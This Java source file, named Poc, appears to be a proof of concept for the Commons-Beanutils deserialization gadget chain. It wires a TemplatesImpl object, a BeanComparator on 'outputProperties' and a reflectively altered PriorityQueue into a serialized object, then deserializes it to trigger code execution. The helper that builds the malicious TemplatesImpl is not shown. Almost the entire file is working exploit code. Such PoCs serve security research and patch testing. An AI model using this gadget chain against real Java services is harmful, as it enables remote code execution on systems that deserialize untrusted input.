package CB;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import pojo.Tools;

import java.io.IOException;
import java.util.PriorityQueue;

public class Poc {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Tools.getTemplatesImpl();
        BeanComparator<Object> beanComparator = new BeanComparator<>();
        Tools.setFieldValue(beanComparator, "property", "outputProperties");

//        beanComparator.compare(templates, "test");

        PriorityQueue<Object> priorityQueue = new PriorityQueue<>();
        Object[] objects = {templates, templates};
        Tools.setFieldValue(priorityQueue, "queue", objects);
        Tools.setFieldValue(priorityQueue, "size", objects.length);

//        priorityQueue.add(templates);
//        priorityQueue.add(templates);
        Tools.setFieldValue(priorityQueue, "comparator", beanComparator);

        byte[] ser = Tools.ser(priorityQueue);
        Object deser = Tools.deser(ser);


    }
}
